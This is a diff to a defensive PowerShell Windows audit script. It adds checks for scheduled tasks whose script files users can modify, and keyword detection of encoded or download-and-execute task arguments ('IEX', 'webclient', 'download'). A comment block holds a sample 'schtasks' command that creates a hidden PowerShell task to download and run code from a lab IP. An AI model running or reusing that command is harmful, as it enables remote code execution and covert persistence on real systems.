@@ -1,4 +1,4 @@
-﻿#Remove any DVD from client
+#Remove any DVD from client
 $drv = (psdrive | where{$_.Free -eq 0})
 if($drv.free -eq "0" -and $_.name -ne "C")
     {
@@ -60,7 +60,8 @@ function reports
 220207.1 - Fixed VBS and MSInfo32 formatting issues. 
 220208.1 - Added start and finish warning for each section to provide some feedback
 220208.2 - Fixed the file\folder parsing loops, included processing that should have been completed after the loops had finished
-
+220211.1 - Added Scheduled task audit looking for embedded code.
+220211.2 - Added < hash hash > to comment out the folder audits.
 
 #> 
 
@@ -1043,6 +1044,111 @@ Write-Host " "
 Write-Host "Finished Auditing Firewall Rules" -foregroundColor Green
 
 ################################################
+##############  SCHEDULED TAsKS  ###############
+################################################ 
+Write-Host " "
+Write-Host "Auditing Scheduled Tasks" -foregroundColor Green
+sleep 5
+
+    $getScTask = Get-ScheduledTask 
+
+    $TaskHash=@()
+    $SchedTaskPerms=@()
+    foreach ($shTask in $getScTask | where {$_.Actions.execute -notlike "*system32*"})
+    
+    {
+        $taskName = $shTask.TaskName
+        $taskPath = $shTask.TaskPath
+        $taskArgs = $shTask.Actions.Arguments
+        $taskExe =  $shTask.Actions.execute
+        $taskSet =  $shTask.Settings
+        $taskSour = $shTask.Source
+        $taskTrig = $shTask.Triggers
+        $taskURI =  $shTask.URI
+ 
+        #find file paths to check for permissions restricted to Admins Only
+        if ($taskExe -ne $null)
+        {
+            #find file paths to check for permissions restricted to Admins Only
+            if ($taskArgs -match "^[a-zA-Z]:")
+            {
+                $getAclArgs = Get-Acl $taskArgs 
+                $getAclArgs.Path.Replace("Microsoft.PowerShell.Core\FileSystem::","")
+                $taskUser = $getAclArgs.Access.IdentityReference
+                $taskPerms = $getAclArgs.Access.FileSystemRights
+
+                $getTaskCon = Get-Content $taskArgs 
+                $syfoldAcl = Get-Acl $taskArgs -ErrorAction SilentlyContinue
+            
+                if ($syfoldAcl | where {$_.accesstostring -like "*Users Allow  Write*" -or $_.accesstostring -like "*Users Allow  Modify*" -or $_.accesstostring -like "*Users Allow  FullControl*"})
+                {
+                    $taskUSerPers = "Warning - User are allowed to WRITE or MODIFY to $taskArgs Warning"
+                }
+                if ($syfoldAcl | where {$_.accesstostring -like "*Everyone Allow  Write*" -or $_.accesstostring -like "*Everyone Allow  Modify*" -or $_.accesstostring -like "*Everyone Allow  FullControl*"})
+                {
+                    $taskUSerPers = "Warning - Everyone are allowed to WRITE or MODIFY to $taskArgs Warning"
+                }
+                if ($syfoldAcl | where {$_.accesstostring -like "*Authenticated Users Allow  Write*" -or $_.accesstostring -like "*Authenticated Users Allow  Modify*" -or $_.accesstostring -like "*Authenticated Users Allow  FullControl*"})
+                {
+                    $taskUSerPers = "Warning - Authenticated User are all0wed to WRITE or MODIFY to $taskArgs Warning"
+                }
+
+                $newObjSchedTaskPerms = New-Object -TypeName PSObject
+                Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskName -Value $taskName
+                Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskPath -Value $taskArgs 
+                Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskContent -Value $getTaskCon
+                Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskPermissions -Value $taskUSerPers
+
+                #Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskUser -Value $taskUser
+                #Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskPermissions -Value $taskUSerPers
+                $SchedTaskPerms += $newObjSchedTaskPerms
+            }
+        }  
+    }
+
+    $SchedTaskEncode=@()
+    #Find hidden code or Base 64 in NON System Directories
+    foreach ($shTask in $getScTask | where {$_.Actions.execute -notlike "*system32*" -and $_.Actions.execute -notlike "*%ProgramFiles%*"})
+ 
+    {
+        $taskName = $shTask.TaskName
+        $taskPath = $shTask.TaskPath
+        $taskArgs = $shTask.Actions.Arguments
+        $taskExe =  $shTask.Actions.execute
+        $taskSet =  $shTask.Settings
+        $taskSour = $shTask.Source
+        $taskTrig = $shTask.Triggers
+        $taskURI =  $shTask.URI
+ 
+        if ($taskExe -ne $null)
+        {
+            if ($taskArgs -notmatch "^[a-zA-Z]:")
+            {
+                if ($taskArgs -like "*encode*"){$taskName = "Warning - Potential Base64 encoded script for $taskName Warning"}
+                if ($taskArgs -like "*webclient*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+                if ($taskArgs -like "*IEX*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+                if ($taskArgs -like "*download*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+
+                $newObjSchedTaskEncode = New-Object -TypeName PSObject
+                Add-Member -InputObject $newObjSchedTaskEncode -Type NoteProperty -Name TaskName -Value $taskName
+                Add-Member -InputObject $newObjSchedTaskEncode -Type NoteProperty -Name TaskExecutable -Value $taskExe
+                Add-Member -InputObject $newObjSchedTaskEncode -Type NoteProperty -Name TaskArguments -Value $taskArgs
+                $SchedTaskEncode += $newObjSchedTaskEncode
+            }
+        }
+    }    
+
+    <#
+    schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
+    
+    Usernames
+
+    #>
+
+Write-Host " "
+Write-Host "Completed Scheduled Tasks" -foregroundColor Green
+
+################################################
 ############  UNQUOTED PATHS  ##################
 ################################################
 Write-Host " "
@@ -1111,6 +1217,15 @@ sleep 7
 
 Write-Host " "
 Write-Host "Finished Searching for UnQuoted Path Vulnerabilities" -foregroundColor Green
+
+#To improve audit and miss the file\folder permissions check comment out the code between to 2 sets of extended hashes
+
+'<#'
+
+#ADD OR REMOVE A < AND HASH ABOVE TO AUDIT FILE SYSTEM AND ADD\REMOVE THE SAME CHARS AT ABOUT LINE 1580
+###########################################################################################################################
+###########################################################################################################################
+###########################################################################################################################
 
 ################################################
 ############  WRITEABLE FILES  #################
@@ -1471,6 +1586,13 @@ sleep 7
 Write-Host " "
 Write-Host "Finised Searching for CreateFile Permissions Vulnerabilities" -foregroundColor Green
 
+###########################################################################################################################
+###########################################################################################################################
+###########################################################################################################################
+
+#REMOVE THE HASH AND > TO AUDIT FILE SYSTEMS
+'#>'
+
 ################################################
 ############  EMBEDDED PASSWORDS  ##############
 ################################################  
@@ -1540,7 +1662,7 @@ Write-Host "Finished Searching for Embedded Password in Files" -foregroundColor 
 
 #Blue - dark
 #FFF9EC = copper
-#284425F = root beer
+#28425F = root beer
 #06273A = alt background 
 #FFEEE0 = Blue dark pastel
 #FF4040 = Red pastel
@@ -1912,6 +2034,10 @@ $descripFile = "System files that allowing users to write can be swapped out for
 
 $descripFirewalls = "Firewalls should always block inbound and exceptions should be to a named IP and Port. Further information can be found @ https://www.tenaka.net/whyhbfirewallsneeded" 
 
+$descripTaskSchPerms = "Checks for Scheduled Tasks excluding any that reference System32 as a directory. These potential user created tasks are checked for scripts and their directory permissionss are validated. No user should be allowed to access the script and make amendments, this is a privilege escaltion route." 
+$descripTaskSchEncode = "Checks for encoded scripts or powershell that make calls off box." 
+
+
 ################################################
 ################  FRAGMENTS  ###################
 ################################################
@@ -1956,6 +2082,13 @@ $descripFirewalls = "Firewalls should always block inbound and exceptions should
     $frag_wFile =  $fragwFile | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>System Files that are Writeable - Security Risk if Exist</span></h2>" -PostContent "<h4>$descripFile</h4>" | Out-String
     $frag_FWProf =   $fragFWProfile | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Firewall Profile</span></h2>"  -PostContent "<h4>$DescripFirewalls</h4>"| Out-String
     $frag_FW =  $fragFW | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Enabled Firewall Rules</span></h2>" | Out-String
+ 
+ 
+    $frag_TaskPerms =  $SchedTaskPerms | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Scheduled Tasks that call on Files on Storage</span></h2>"  -PostContent "<h4>$descripTaskSchPerms</h4>" | Out-String
+    $frag_TaskEncode =  $SchedTaskEncode | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Scheduled Tasks that contain something Encoded</span></h2>"  -PostContent "<h4>$descripTaskSchEncode</h4>" | Out-String
+
+ 
+ 
     
 ################################################
 ############  CREATE HTML REPORT  ##############
@@ -1984,6 +2117,8 @@ $descripFirewalls = "Firewalls should always block inbound and exceptions should
     $frag_FilePass,
     $frag_AutoLogon,
     $frag_UnQu, 
+    $frag_TaskPerms,
+    $frag_TaskEncode,
     $frag_PSPass,
     $frag_LegNIC,
     $frag_SysRegPerms,
@@ -2027,5 +2162,6 @@ Netbios Node type check reg path and value
 remove extra blanks when listing progs via registry 
 FLTMC.exe - mini driver altitude looking for 'stuff' thats at an altitude to bypass security or encryption
 report on appX bypass and seriousSam
+DRIVERQUERY /SI - driver signing
 #>
 
